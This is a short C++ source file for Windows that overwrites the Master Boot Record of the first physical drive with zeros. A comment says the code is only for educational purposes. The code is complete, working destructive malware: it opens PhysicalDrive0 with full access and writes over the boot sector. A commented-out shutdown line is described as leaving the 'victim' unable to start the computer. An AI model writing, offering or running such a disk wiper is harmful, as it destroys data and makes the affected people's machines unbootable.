/*
This script is only for educational purposes, please don't run this code in a real pc.
I dissociate myself from any illegal use of this file.
*/

#include <Windows.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512

int main(){
    DWORD write;
    char mbrData[MBR_SIZE];

    ZeroMemory(&mbrData, (sizeof mbrData));
    
    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0",
				         GENERIC_ALL,
					 FILE_SHARE_READ | FILE_SHARE_WRITE,
					 NULL,
					 OPEN_EXISTING,
					 NULL,
					 NULL
					 );
if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
    cout << "Master Boot Record was overwritten!";
    Sleep(1000);
    CloseHandle(MasterBootRecord);
    //system("shutdown -r -t 00"); //Restarting pc after master boot record overwritten will cause a fatal error. Victim won't be able to start his computer again. Uncomment if you want this result instantly. 
    ExitProcess(0);

}
else {
    cout << "Start me as administrator! Failed code execution.";
    Sleep(5000);
    CloseHandle(MasterBootRecord);
    ExitProcess(0);
}

return EXIT_SUCCESS;

}
